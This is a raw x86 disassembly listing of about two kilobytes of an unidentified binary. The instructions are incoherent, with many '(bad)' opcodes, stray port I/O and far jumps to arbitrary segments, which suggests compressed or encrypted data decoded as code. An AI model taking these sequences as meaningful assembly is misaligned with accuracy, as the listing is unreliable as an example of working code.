  410dd3:	mov    edi,0xeadce368
  410dd8:	sub    BYTE PTR [eax+0xf],al
  410ddb:	(bad)  
  410ddd:	mov    ecx,0x1a3b8752
  410de2:	lds    ebx,FWORD PTR [ecx]
  410de4:	add    DWORD PTR [ecx-0x1a],edi
  410de7:	sbb    DWORD PTR [edi],esi
  410de9:	aas    
  410dea:	dec    esi
  410deb:	rol    DWORD PTR [edx+ebx*1],cl
  410dee:	aam    0xc9
  410df0:	add    eax,0x33bdb460
  410df5:	cdq    
  410df6:	cmp    al,0xf
  410df8:	add    DWORD PTR [ecx-0x31],esi
  410dfb:	mov    al,0x7a
  410dfd:	adc    ecx,DWORD PTR [eax]
  410dff:	jb     0x410dac
  410e01:	push   edx
  410e02:	addr16 xor ah,cl
  410e05:	and    ebx,DWORD PTR [ebx+eiz*1-0x7]
  410e09:	sti    
  410e0a:	(bad)  
  410e0b:	cs mov ebx,0xa9a09195
  410e11:	dec    eax
  410e12:	call   0x1824ecfb
  410e17:	out    0x37,al
  410e19:	mov    ds:0x94379ce2,al
  410e1e:	adc    DWORD PTR [eax],0xffffffd3
  410e21:	fldenv [esi]
  410e23:	lds    esi,FWORD PTR [eax]
  410e25:	adc    eax,0x1d116fab
  410e2a:	(bad)
  410e2d:	aas    
  410e2e:	inc    edx
  410e2f:	jmp    0xc4be:0x3dba4093
  410e36:	(bad)  
  410e37:	lods   eax,DWORD PTR ds:[esi]
  410e38:	sahf   
  410e39:	jb     0x410e50
  410e3b:	stos   DWORD PTR es:[edi],eax
  410e3c:	pop    esi
  410e3d:	ret    
  410e3e:	jnp    0x410dd3
  410e40:	rol    dl,0xc2
  410e43:	mov    ecx,0x1f594f9
  410e48:	xchg   ebp,eax
  410e49:	(bad)  
  410e4a:	cmp    BYTE PTR [edx-0x3d],bh
  410e4d:	add    eax,0x9996285b
  410e52:	push   esi
  410e53:	xchg   ebx,eax
  410e54:	mov    eax,0xff271721
  410e59:	add    BYTE PTR [eax-0x3e33c279],0x81
  410e60:	add    eax,0x39f6300d
  410e65:	fldln2 
  410e67:	sbb    BYTE PTR [edi+0x77],cl
  410e6a:	pop    ss
  410e6b:	mov    bh,0xa
  410e6d:	mov    al,ds:0xcb37eebb
  410e72:	addr16 (bad) 
  410e74:	fwait
  410e75:	rcr    BYTE PTR es:[esi+0x23b8dbf3],1
  410e7c:	sub    bl,cl
  410e7e:	mov    ebp,0x390c83b0
  410e83:	inc    edx
  410e84:	sbb    BYTE PTR [esi+0x63],ah
  410e87:	jecxz  0x410ecf
  410e89:	sub    eax,0x9f4e6032
  410e8e:	js     0x410e44
  410e90:	sahf   
  410e91:	push   0xffffffdd
  410e93:	jnp    0x410e27
  410e95:	lods   eax,DWORD PTR ds:[esi]
  410e96:	xchg   DWORD PTR [edx+0x12d92e3],ecx
  410e9c:	jecxz  0x410e72
  410e9e:	jle    0x410e5d
  410ea0:	loope  0x410eca
  410ea2:	outs   dx,BYTE PTR ds:[esi]
  410ea3:	jecxz  0x410ebc
  410ea5:	push   ds
  410ea6:	mov    ch,0x93
  410ea8:	adc    BYTE PTR [ecx],0x1d
  410eab:	pop    edi
  410eac:	jp     0x410f16
  410eae:	jmp    0x10c789e5
  410eb3:	fadd   st,st(2)
  410eb5:	xor    DWORD PTR [ecx-0x5c923d29],ebx
  410ebb:	icebp  
  410ebc:	stos   DWORD PTR es:[edi],eax
  410ebd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ebe:	out    0x11,eax
  410ec0:	jmp    0x410f14
  410ec2:	ins    BYTE PTR es:[edi],dx
  410ec3:	in     eax,0x93
  410ec5:	push   0xffffff8f
  410ec7:	jb     0x410f0f
  410ec9:	fs scas eax,DWORD PTR es:[edi]
  410ecb:	adc    BYTE PTR ss:[ebp-0x69],0x65
  410ed0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ed1:	stos   BYTE PTR es:[edi],al
  410ed2:	retf   0x2918
  410ed5:	sub    al,0x21
  410ed7:	ins    DWORD PTR es:[edi],dx
  410ed8:	loopne 0x410f0f
  410eda:	and    DWORD PTR [edx-0x3f],edi
  410edd:	(bad)  
  410ede:	mov    al,0x74
  410ee0:	fiadd  WORD PTR [ecx]
  410ee2:	rcr    BYTE PTR [eax+ebx*8-0x57],1
  410ee6:	jle    0x410eb8
  410ee8:	and    bh,BYTE PTR ds:0x491eb350
  410eee:	push   esp
  410eef:	pop    ecx
  410ef0:	adc    eax,DWORD PTR [ebx]
  410ef2:	nop
  410ef3:	scas   eax,DWORD PTR es:[edi]
  410ef4:	dec    ebp
  410ef5:	dec    edi
  410ef6:	ror    DWORD PTR [esi-0x13],1
  410ef9:	sbb    ebp,DWORD PTR [edx+0x34]
  410efc:	je     0x410e80
  410efe:	andnps xmm3,xmm6
  410f01:	or     ah,BYTE PTR [eax+0x6e]
  410f04:	test   al,0xc
  410f06:	retf   0xd05c
  410f09:	cmp    eax,eax
  410f0b:	sub    al,0x11
  410f0d:	mov    cl,al
  410f0f:	cmp    DWORD PTR ds:0xb9aa3536,0xffffffc7
  410f16:	adc    BYTE PTR ds:0x9666fbad,bh
  410f1c:	scas   al,BYTE PTR es:[edi]
  410f1d:	aad    0xf
  410f1f:	int3   
  410f20:	(bad)  
  410f21:	lods   al,BYTE PTR ds:[esi]
  410f22:	aam    0x41
  410f24:	stos   DWORD PTR es:[edi],eax
  410f25:	cmp    eax,esi
  410f27:	mov    dl,BYTE PTR ds:0x780fac79
  410f2d:	(bad)  
  410f2e:	xor    ch,ah
  410f30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f31:	bound  ebp,QWORD PTR [esi-0x24cb0e9e]
  410f37:	add    al,0x47
  410f39:	fidivr DWORD PTR [esi-0x4794da50]
  410f3f:	sub    BYTE PTR [ecx+0x3ce8d01b],0x4a
  410f46:	daa    
  410f47:	jo     0x410f02
  410f49:	sub    eax,0xd581d608
  410f4e:	or     ah,0x18
  410f51:	gs mov cl,0xd8
  410f54:	push   ebx
  410f55:	sub    dl,cl
  410f57:	cmp    bl,BYTE PTR [esi+0x10d4b872]
  410f5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f5e:	outs   dx,BYTE PTR ds:[esi]
  410f5f:	sbb    al,0x17
  410f61:	xor    al,ch
  410f63:	dec    eax
  410f64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f65:	test   BYTE PTR [esi+0x76],dl
  410f68:	mov    al,ds:0x72c6b42d
  410f6d:	adc    eax,0xb32b71c4
  410f72:	scas   eax,DWORD PTR es:[edi]
  410f73:	jg     0x410f84
  410f75:	fisubr WORD PTR [ebx]
  410f77:	xor    eax,0xf6428d40
  410f7c:	arpl   WORD PTR [esi],bx
  410f7e:	and    al,0xf
  410f80:	mov    bh,0x2b
  410f82:	in     al,0xe4
  410f84:	ror    BYTE PTR [edx-0x3c],cl
  410f87:	aaa    
  410f88:	imul   esi,DWORD PTR [edi-0x70],0x7d354388
  410f8f:	(bad)  
  410f90:	mov    dl,0x71
  410f92:	outs   dx,BYTE PTR ds:[esi]
  410f93:	cmp    al,0x1f
  410f95:	dec    ebp
  410f96:	fs call 0xf1a9:0x281b09e7
  410f9e:	loopne 0x410fe0
  410fa0:	ret    
  410fa1:	pusha  
  410fa2:	mov    al,ds:0xdf2d6c04
  410fa7:	xchg   esp,eax
  410fa8:	lods   al,BYTE PTR ds:[esi]
  410fa9:	shl    DWORD PTR [esi],cl
  410fab:	mov    al,ds:0x5e0ba98e
  410fb0:	imul   esi,DWORD PTR [edx-0x13dd1932],0xeb54149d
  410fba:	lods   eax,DWORD PTR ds:[esi]
  410fbb:	(bad)  
  410fbe:	adc    eax,0x9e905528
  410fc3:	mov    ebx,0xa0568ea6
  410fc8:	imul   ecx,edx,0x23
  410fcb:	sub    al,0x59
  410fcd:	xor    bl,BYTE PTR [edx+eax*1+0x74]
  410fd1:	retf   
  410fd2:	mov    esp,0x3ed30ad7
  410fd7:	popf   
  410fd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fd9:	sbb    ebx,DWORD PTR [esp+esi*4+0x56]
  410fdd:	and    DWORD PTR [edx+ebp*8+0x3a95f072],0x16
  410fe5:	jmp    0xac93e079
  410fea:	pop    edx
  410feb:	repz and esp,0xffffff9e
  410fef:	ss xchg ebx,eax
  410ff1:	scas   eax,DWORD PTR es:[edi]
  410ff2:	push   cs
  410ff3:	cli    
  410ff4:	(bad)  
  410ff5:	adc    esi,eax
  410ff7:	int3   
  410ff8:	call   0x6f04d75
  410ffd:	pop    ecx
  410ffe:	adc    DWORD PTR [eax-0x6b],ebx
  411001:	fadd   QWORD PTR [esi]
  411003:	arpl   cx,si
  411005:	lock inc eax
  411007:	mov    DWORD PTR [esi-0x68],esp
  41100a:	adc    ah,bh
  41100c:	scas   eax,DWORD PTR es:[edi]
  41100d:	ficomp DWORD PTR [esi-0xe]
  411010:	mov    bh,0xa6
  411012:	adc    BYTE PTR [edi],bh
  411014:	mov    ebx,0xfd38eb68
  411019:	lea    ebx,[ecx-0x2f]
  41101c:	xchg   ebx,eax
  41101d:	mov    cl,0x40
  41101f:	push   edi
  411020:	popa   
  411021:	sub    edi,edx
  411023:	repz data16 or al,0x3
  411027:	sbb    dh,BYTE PTR [ebx+0x498dfc0d]
  41102d:	out    dx,al
  41102e:	fwait
  41102f:	push   esi
  411030:	out    dx,eax
  411031:	adc    al,0x11
  411033:	adc    bl,BYTE PTR [ebx+0x6d]
  411036:	adc    al,0xa9
  411038:	dec    ebp
  411039:	or     DWORD PTR [edi-0xe7f75ad],edi
  41103f:	scas   al,BYTE PTR es:[edi]
  411040:	dec    esp
  411041:	in     al,0x7d
  411043:	dec    ecx
  411044:	xchg   edi,eax
  411045:	fcomp  DWORD PTR [edx+0x3618af81]
  41104b:	aas    
  41104c:	daa    
  41104d:	jp     0x4110b4
  41104f:	aad    0x7
  411051:	leave  
  411052:	dec    edx
  411053:	pop    eax
  411054:	fwait
  411055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411056:	outs   dx,DWORD PTR ds:[esi]
  411057:	leave  
  411058:	std    
  411059:	test   BYTE PTR [esi],0xbe
  41105c:	push   cs
  41105d:	mov    DWORD PTR [ebp-0x1196e8f6],ecx
  411063:	lahf   
  411064:	iret   
  411065:	shl    DWORD PTR [edi+0x44e52294],0x5d
  41106c:	xchg   ebp,eax
  41106d:	mov    ebp,0x37f2b068
  411072:	(bad)  [ebx-0x754183ed]
  411078:	and    dh,cl
  41107a:	lods   eax,DWORD PTR ds:[esi]
  41107b:	fs fmulp st(6),st
  41107e:	add    edx,DWORD PTR [edx+0x34f87604]
  411084:	movlps QWORD PTR [ebx+eax*4],xmm4
  411088:	aaa    
  411089:	pop    edi
  41108a:	mov    ds:0x276d2a0f,al
  41108f:	xor    DWORD PTR [edx+0x44],edi
  411092:	mov    ebp,DWORD PTR [ecx]
  411094:	repnz (bad) 
  411096:	jnp    0x41106d
  411098:	sub    dh,bl
  41109a:	sbb    dl,cl
  41109c:	das    
  41109d:	lds    edi,FWORD PTR [ecx+esi*1]
  4110a0:	cdq    
  4110a1:	ss and al,0x57
  4110a4:	pop    edx
  4110a5:	loopne 0x411109
  4110a7:	enter  0xd665,0xb8
  4110ab:	xor    dl,BYTE PTR [edi+0x79]
  4110ae:	push   edi
  4110af:	out    dx,al
  4110b0:	mov    ebp,0xe21745c5
  4110b5:	fstp   TBYTE PTR [edx-0x2e]
  4110b8:	call   0xbfd52cd6
  4110bd:	jmp    DWORD PTR [eax+0x5df0ac9c]
  4110c3:	or     eax,0xd95c53f3
  4110c8:	inc    esp
  4110c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110ca:	cmp    DWORD PTR [edx],ebp
  4110cc:	xor    BYTE PTR [eax+0x248e9db1],0xe7
  4110d3:	pop    eax
  4110d4:	pop    esi
  4110d5:	sub    eax,0xb3f42991
  4110da:	lds    ecx,FWORD PTR [esi]
  4110dc:	ror    BYTE PTR [edx*8-0x17221b4b],cl
  4110e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110e4:	inc    esp
  4110e5:	imul   ecx,DWORD PTR [ebx+0x34],0x48b6e4
  4110ec:	loope  0x411119
  4110ee:	dec    ecx
  4110ef:	xor    DWORD PTR [esi+eiz*8+0x25],ebx
  4110f3:	mov    dl,0x9d
  4110f5:	enter  0xacf4,0x6e
  4110f9:	pusha  
  4110fa:	and    esi,DWORD PTR [eax+0x4a]
  4110fd:	sbb    DWORD PTR [eax+0x2540775c],ebp
  411103:	pop    ebx
  411104:	pop    edi
  411105:	inc    ebp
  411106:	popf   
  411107:	inc    eax
  411108:	pop    ebx
  411109:	addr16 xchg ebp,eax
  41110b:	mov    gs,WORD PTR [eax-0x2fc28a44]
  411111:	and    DWORD PTR [edx-0x53],ebx
  411114:	jb     0x4110b6
  411116:	mov    ebp,0x2754e102
  41111b:	fnsave [edi-0x2bc38b03]
  411121:	mul    DWORD PTR [edi-0xe3fb85]
  411127:	das    
  411128:	cmp    eax,0x826b5627
  41112d:	sbb    ebx,DWORD PTR ds:0x2a038f2d
  411133:	(bad)  
  411134:	std    
  411135:	pop    ds
  411136:	push   esp
  411137:	push   esi
  411138:	xlat   BYTE PTR ds:[ebx]
  411139:	and    ecx,DWORD PTR [eax]
  41113b:	and    eax,0xffa81bc7
  411140:	(bad)  [edx-0x4fc38968]
  411146:	ja     0x4110d4
  411148:	adc    eax,0xc4a58f7d
  41114d:	pop    edx
  41114e:	jmp    0x1dee491
  411153:	mov    ds:0x77f1444e,al
  411158:	inc    ebx
  411159:	sub    esp,DWORD PTR [esp+esi*2]
  41115c:	call   0x4ba6:0xf5d5b6f
  411163:	iret   
  411164:	or     eax,0xce1a3fb1
  411169:	xchg   edx,eax
  41116a:	xchg   ebp,eax
  41116b:	dec    ebp
  41116c:	push   edx
  41116d:	or     dh,bl
  41116f:	dec    edi
  411170:	imul   esp,DWORD PTR [ebp+edi*1+0x23e3d846],0xffffff91
  411178:	(bad)  
  41117a:	rcr    BYTE PTR [ecx+edx*8+0x16262443],0x65
  411182:	cld    
  411183:	out    dx,eax
  411184:	sbb    edx,DWORD PTR [eax]
  411186:	lods   eax,DWORD PTR ds:[esi]
  411187:	cmp    al,0x61
  411189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41118a:	jge    0x4111d3
  41118c:	cmc    
  41118d:	sub    DWORD PTR [edx-0x1c],esi
  411190:	cwde   
  411191:	mov    ecx,0xef5661f4
  411196:	or     dl,0xda
  411199:	inc    ebx
  41119a:	ret    0x589d
  41119d:	shl    BYTE PTR [ecx-0x4a],1
  4111a0:	cmc    
  4111a1:	int3   
  4111a2:	lds    ebx,FWORD PTR [esi-0x73]
  4111a5:	push   ds
  4111a6:	mov    WORD PTR [esi+0x1d],?
  4111a9:	enter  0xba00,0x6
  4111ad:	inc    edi
  4111ae:	(bad)  
  4111af:	xor    eax,0x4817bdff
  4111b4:	mov    eax,0xb3f8595d
  4111b9:	fisub  WORD PTR [eax-0x1acfa09e]
  4111bf:	jle    0x411148
  4111c1:	lods   eax,DWORD PTR ds:[esi]
  4111c2:	and    BYTE PTR [eax+eiz*1],bh
  4111c5:	out    dx,eax
  4111c6:	fiadd  WORD PTR [edi]
  4111c8:	pop    ebp
  4111c9:	loopne 0x41123a
  4111cb:	fcmovnbe st,st(4)
  4111cd:	push   ebp
  4111ce:	idiv   DWORD PTR [ecx-0x6f1eb0d0]
  4111d4:	jl     0x411183
  4111d6:	retf   0x68a
  4111d9:	in     eax,dx
  4111da:	jne    0x4111a1
  4111dc:	adc    al,0xb3
  4111de:	js     0x4111d2
  4111e0:	adc    dh,BYTE PTR [ebx+ebp*4+0x3bf9d35]
  4111e7:	xchg   esi,eax
  4111e8:	inc    esp
  4111e9:	enter  0x6578,0xa8
  4111ed:	retf   0xca4a
  4111f0:	mov    ecx,0xa895cfb2
  4111f5:	clc    
  4111f6:	mov    al,ds:0x21639f59
  4111fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111fc:	out    0x5,al
  4111fe:	mov    ebp,0xa84333bd
  411203:	cdq    
  411204:	inc    edi
  411205:	fsubr  QWORD PTR [edi+0x56e6a61]
  41120b:	js     0x4111ae
  41120d:	lods   eax,DWORD PTR ds:[esi]
  41120e:	and    DWORD PTR [esi+0x3f],ebp
  411211:	and    dh,ah
  411213:	and    BYTE PTR [esi+0x52],al
  411216:	push   0x66
  411218:	and    BYTE PTR [esi-0x5aadff98],bl
  41121e:	cmp    ebx,ebp
  411220:	fldcw  WORD PTR [ebx]
  411222:	icebp  
  411223:	add    eax,0xec78d001
  411228:	adc    ebp,edi
  41122a:	fwait
  41122b:	loope  0x41126c
  41122d:	dec    ebp
  41122e:	cmp    ebp,DWORD PTR [edx]
  411230:	ret    0x9229
  411233:	aas    
  411234:	stc    
  411235:	pop    edi
  411236:	sbb    DWORD PTR [edi],eax
  411238:	or     al,BYTE PTR [bx]
  41123b:	inc    ebp
  41123c:	mov    cs,WORD PTR [edx-0x7]
  41123f:	cmc    
  411240:	inc    esi
  411241:	add    eax,0xf4cb0f01
  411246:	add    DWORD PTR [edx+0x7b],ecx
  411249:	jae    0x411239
  41124b:	ret    0x7d45
  41124e:	div    BYTE PTR [esi-0x2a196c18]
  411254:	lea    eax,ss:[edx+0x4a]
  411258:	aam    0xb2
  41125a:	dec    dl
  41125c:	push   ds
  41125d:	scas   eax,DWORD PTR es:[edi]
  41125e:	(bad)  [esi+0x68e6a138]
  411264:	cwde   
  411265:	add    al,0x98
  411267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411268:	mov    ds:0xbc635b0f,al
  41126e:	mov    DWORD PTR [edi],ebx
  411270:	xchg   edx,eax
  411271:	sbb    eax,0xfa5c11e
  411276:	nop
  411277:	fcmovu st,st(3)
  411279:	rol    BYTE PTR [ecx+0x3492ade],0xbd
  411280:	data16 fwait
  411282:	push   0xfdbd1d3d
  411287:	push   0x72
  411289:	and    dh,BYTE PTR [esi-0x52dcb587]
  41128f:	pop    edx
  411290:	xchg   esi,eax
  411291:	test   DWORD PTR cs:[eax+0x70],ecx
  411295:	test   eax,0x71e12406
  41129a:	jmp    0x8bd160bb
  41129f:	pop    esp
  4112a0:	aam    0x62
  4112a2:	xchg   ebx,eax
  4112a3:	std    
  4112a4:	(bad)  [edi-0x466c663a]
  4112aa:	retf   
  4112ab:	stc    
  4112ac:	adc    al,0xdd
  4112ae:	push   0x518d40f1
  4112b3:	(bad)  
  4112b4:	jecxz  0x411281
  4112b6:	lds    esi,FWORD PTR [ebx+0x6e52c309]
  4112bc:	inc    esp
  4112bd:	cmp    eax,0x8ff51a7e
  4112c2:	icebp  
  4112c3:	je     0x411272
  4112c5:	scas   al,BYTE PTR es:[edi]
  4112c6:	jg     0x4112e6
  4112c8:	dec    eax
  4112c9:	adc    DWORD PTR [edi-0x16],edi
  4112cc:	ret    
  4112cd:	cmp    ebx,DWORD PTR [ebp-0x65826689]
  4112d3:	inc    edx
  4112d4:	(bad)  
  4112d6:	imul   esi,DWORD PTR [ebx-0x456502a],0xffffffbc
  4112dd:	jmp    0x41133a
  4112df:	mov    ch,BYTE PTR [eax]
  4112e1:	jmp    FWORD PTR [eax]
  4112e3:	retf   
  4112e4:	push   ebp
  4112e5:	pop    esi
  4112e6:	mov    eax,ds:0x3a6099f0
  4112eb:	pushf  
  4112ec:	cmp    ecx,esp
  4112ee:	xor    al,0x13
  4112f0:	inc    ebx
  4112f1:	test   ah,ah
  4112f3:	clc    
  4112f4:	mov    bl,0x24
  4112f6:	sbb    ebx,DWORD PTR [edx-0x1b]
  4112f9:	fiadd  WORD PTR fs:[ecx-0x3117665]
  411300:	sub    ah,dh
  411302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411303:	dec    ebp
  411304:	sahf   
  411305:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411307:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  411309:	loope  0x4112c5
  41130b:	(bad)  
  41130c:	xor    esi,DWORD PTR [ebx-0x7d]
  41130f:	dec    eax
  411310:	inc    edx
  411311:	into   
  411312:	xlat   BYTE PTR ds:[ebx]
  411313:	popf   
  411314:	out    0xe0,al
  411316:	add    edx,0x50
  411319:	sbb    eax,0xab25b25a
  41131e:	mov    ds:0xfb50d3ba,al
  411323:	mov    ebp,0xec408437
  411328:	test   BYTE PTR [esi],0xe5
  41132b:	popf   
  41132c:	or     DWORD PTR [ecx],0x5663dede
  411332:	or     al,0x16
  411334:	or     al,0x19
  411336:	adc    BYTE PTR [eax-0x41],bl
  411339:	add    DWORD PTR [edx+0x7f],edi
  41133c:	aam    0xa2
  41133e:	inc    edi
  41133f:	sub    al,0x51
  411341:	imul   eax,DWORD PTR [ebp-0x37],0x53
  411345:	rcr    ah,cl
  411347:	dec    esi
  411348:	iret   
  411349:	jp     0x411376
  41134b:	loopne 0x4113bb
  41134d:	ret    0x6163
  411350:	xor    BYTE PTR [edx],al
  411352:	inc    eax
  411353:	cdq    
  411354:	outs   dx,DWORD PTR ds:[esi]
  411355:	call   0x1967:0x62221221
  41135c:	cld    
  41135d:	mov    ch,0x67
  41135f:	fidiv  DWORD PTR [ebp+ecx*2+0x302c3ffa]
  411366:	loope  0x411310
  411368:	(bad)  
  411369:	lea    eax,[ebx-0x142c946f]
  41136f:	(bad)  
  411370:	push   esi
  411371:	xchg   DWORD PTR [ebx-0x2296b6c1],edx
  411377:	pop    ss
  411378:	iret   
  411379:	adc    DWORD PTR [eax-0x73f66a4d],eax
  41137f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411380:	pop    ds
  411381:	sbb    BYTE PTR [ecx-0x9],cl
  411384:	pop    ss
  411385:	int3   
  411386:	adc    esi,DWORD PTR ds:0xf01ad29
  41138c:	cs and ecx,eax
  41138f:	pop    ss
  411390:	leave  
  411391:	popf   
  411392:	in     al,0x2a
  411394:	xchg   ebx,eax
  411395:	aad    0xb2
  411397:	in     eax,dx
  411398:	and    ebx,DWORD PTR [ecx+0x28]
  41139b:	jae    0x4113f0
  41139d:	inc    DWORD PTR [eax-0x63]
  4113a0:	mov    dl,BYTE PTR [eax-0x47e5ad55]
  4113a6:	ins    BYTE PTR es:[edi],dx
  4113a7:	shl    BYTE PTR [edx],0x4
  4113aa:	and    DWORD PTR [edx-0x5547121],esp
  4113b0:	jns    0x411361
  4113b2:	pop    ecx
  4113b3:	leave  
  4113b4:	mov    ebp,0xf3a48c81
  4113b9:	test   eax,0x18e74f21
  4113be:	sub    DWORD PTR [ecx-0x68a2e1ad],esp
  4113c4:	jae    0x41143d
  4113c6:	call   DWORD PTR [ebp+0x69]
  4113c9:	es xchg esp,eax
  4113cb:	cmp    eax,0x64c9ca3c
  4113d0:	out    0x2f,eax
  4113d2:	pushf  
  4113d3:	jecxz  0x4113fd
  4113d5:	in     eax,dx
  4113d6:	(bad)  
  4113d7:	xchg   ebp,eax
  4113d8:	mov    dl,0xe4
  4113da:	fidivr DWORD PTR [esp+edi*4]
  4113dd:	das    
  4113de:	mul    DWORD PTR [ebx+0x49634c2]
  4113e4:	pop    ds
  4113e5:	pusha  
  4113e6:	imul   esp,DWORD PTR [edx+0x20],0xffffffa1
  4113ea:	xchg   DWORD PTR [edx],ebp
  4113ec:	or     ebx,DWORD PTR [ecx]
  4113ee:	fwait
  4113ef:	pop    esi
  4113f0:	mov    al,ds:0x5c052f92
  4113f5:	dec    edx
  4113f6:	add    DWORD PTR [ecx+0x5ddf5e57],esi
  4113fc:	add    eax,0x424aa62d
  411401:	sub    al,0x39
  411403:	div    dl
  411405:	ins    BYTE PTR es:[edi],dx
  411406:	dec    ecx
  411407:	mov    ebx,0xe4c23736
  41140c:	sub    eax,0x52ce7f98
  411411:	adc    eax,0xf8a12061
  411416:	ds xor al,BYTE PTR ds:[ecx+0x4b8f001f]
  41141e:	and    dl,BYTE PTR [esi+0x3ae85b42]
  411424:	sti    
  411425:	pusha  
  411426:	sub    DWORD PTR [edx+0x11d723bd],esi
  41142c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41142d:	rol    BYTE PTR [edx],0xd2
  411430:	jmp    0x41143b
  411432:	and    BYTE PTR [eax],dh
  411434:	(bad)  
  411435:	mov    ebx,0x6973be60
  41143a:	push   ebp
  41143b:	pop    edx
  41143c:	inc    ecx
  41143d:	adc    al,BYTE PTR [ebx]
  41143f:	mov    ch,0xa7
  411441:	dec    eax
  411442:	rcr    BYTE PTR fs:[edi+0xb],0x3a
  411447:	popf   
  411448:	fcmovnbe st,st(6)
  41144a:	mov    esi,0xbd843ccb
  41144f:	or     edx,0xc251307
  411455:	push   es
  411456:	cmp    BYTE PTR [ebx],dl
  411458:	cmp    DWORD PTR [ebp-0x29dce523],esp
  41145e:	lock mov ebp,0x5438e4eb
  411464:	iret   
  411465:	retf   
  411466:	cli    
  411467:	jae    0x41149a
  411469:	ins    BYTE PTR es:[edi],dx
  41146a:	push   0x7b6487e2
  41146f:	push   ebp
  411470:	mov    dh,BYTE PTR [edx+0x227f9183]
  411476:	adc    DWORD PTR [ecx],edi
  411478:	mov    ecx,0xbf09dffd
  41147d:	mov    ecx,0xd60d9843
  411482:	push   ecx
  411483:	cs jae 0x411469
  411486:	sahf   
  411487:	dec    edi
  411488:	xor    BYTE PTR [esi],al
  41148a:	ja     0x4114dc
  41148c:	out    dx,eax
  41148d:	(bad)  
  41148f:	fist   WORD PTR [edi-0x69]
  411492:	into   
  411493:	xchg   edx,eax
  411494:	xchg   edi,eax
  411495:	inc    edx
  411496:	bound  eax,QWORD PTR [eax]
	...
  411514:	cmp    al,0xe5
  411516:	mov    esi,0xbf7fff35
  41151b:	in     eax,dx
  41151c:	mov    ecx,0x758896da
  411521:	ficomp DWORD PTR [ecx]
  411523:	fild   QWORD PTR ds:0x6b0000bf
  411529:	pop    es
  41152a:	add    BYTE PTR [eax],al
  41152c:	repz jae 0x41157e
  41152f:	pop    edi
  411530:	repnz push ss
  411532:	jno    0x4114bc
  411534:	pop    ss
  411535:	jl     0x411576
  411537:	add    al,0x66
  411539:	dec    edi
  41153a:	ins    BYTE PTR es:[edi],dx
  41153b:	xor    bh,BYTE PTR [ebx+ebp*1]
  41153e:	daa    
  41153f:	pop    cx
  411541:	icebp  
  411542:	fdivr  st(0),st
  411544:	jo     0x411547
  411546:	dec    ebx
  411547:	inc    edx
  411548:	shr    edx,cl
  41154a:	stc    
  41154b:	fnstsw WORD PTR cs:[ebx+0x6926fa93]
  411552:	xchg   esp,eax
  411553:	mov    eax,ds:0x5cfe072b
  411558:	jbe    0x41158d
  41155a:	mov    edx,0xa59222b
  41155f:	in     al,dx
  411560:	sahf   
  411561:	in     al,0x2
  411563:	push   eax
  411564:	sbb    DWORD PTR [esi+0x54a6e300],0x3d
  41156b:	pop    edx
  41156c:	or     bl,dh
  41156e:	jbe    0x4115e4
  411570:	aaa    
  411571:	test   DWORD PTR [edx+0x4cb4d8d3],ebx
  411577:	xchg   esp,eax
  411578:	xor    BYTE PTR [ecx-0x8],ah
  41157b:	pop    esi
  41157c:	or     eax,0x1b45c6e3
  411581:	push   edi
  411582:	xchg   ecx,eax
  411583:	jp     0x4115b4
  411585:	ss dec ebp
  411587:	and    cl,BYTE PTR [ebp+0x4476ab40]
  41158d:	mov    ebx,0xb6fb48a5
  411592:	cdq    
  411593:	loopne 0x4115da
  411595:	out    dx,eax
  411596:	mov    ecx,0xc6f56424
  41159b:	jecxz  0x411586
  41159d:	jp     0x4115b7
  41159f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115a0:	pmulhw mm7,QWORD PTR [ecx+0x56]
  4115a4:	mov    dl,ch
  4115a6:	mov    al,0x69
  4115a8:	xchg   DWORD PTR [ebx],esp
  4115aa:	frstor [edx-0x20]
  4115ad:	push   ebx
  4115ae:	aaa    
  4115af:	loope  0x4115a7
  4115b1:	sti    
  4115b2:	push   edx
  4115b3:	xlat   BYTE PTR ds:[ebx]
  4115b4:	js     0x411586
  4115b6:	ret    
  4115b7:	imul   ebx,DWORD PTR [esp+ecx*4-0x4c259960],0xffffffc7
  4115bf:	sub    BYTE PTR ds:0x22d3f241,dl
  4115c5:	repz sub edi,ebx
  4115c8:	fiadd  WORD PTR [ecx-0x68]
  4115cb:	mov    dh,0x4e
  4115cd:	scas   eax,DWORD PTR es:[edi]
  4115ce:	inc    esp
  4115cf:	pusha  
  4115d0:	imul   bx,WORD PTR [ebx],0x34e1
  4115d5:	ror    BYTE PTR [edi-0x21],0xc5
  4115d9:	lods   al,BYTE PTR ds:[esi]
  4115da:	pop    ecx
  4115db:	lods   eax,DWORD PTR ds:[esi]
  4115dc:	arpl   WORD PTR [edx-0x56b36a4b],sp
  4115e2:	out    0x79,al
  4115e4:	add    bx,dx
  4115e7:	sub    al,0x1
  4115e9:	jmp    0x47c2:0x98b37532
  4115f0:	mov    esp,0xb1110271
  4115f5:	mov    al,ds:0x89920305
  4115fa:	les    edx,FWORD PTR [ebp+eax*1-0x7ff20f46]
  411601:	inc    ecx
  411602:	scas   eax,DWORD PTR es:[edi]
  411603:	sbb    BYTE PTR [ecx],bh
  411605:	mov    cs,WORD PTR [ebx-0x543d122d]
  41160b:	ret    0x4b31
  41160e:	sar    DWORD PTR [edx+0x26322df8],0x68
  411615:	mov    edx,0xaefe4565
  41161a:	sub    esp,DWORD PTR [esi-0x48f4dd71]
  411620:	pop    edi
  411621:	lds    esi,FWORD PTR [eax]
  411623:	mov    ch,BYTE PTR [ecx]
  411625:	cdq    
  411626:	lahf   
  411627:	add    al,0xf0
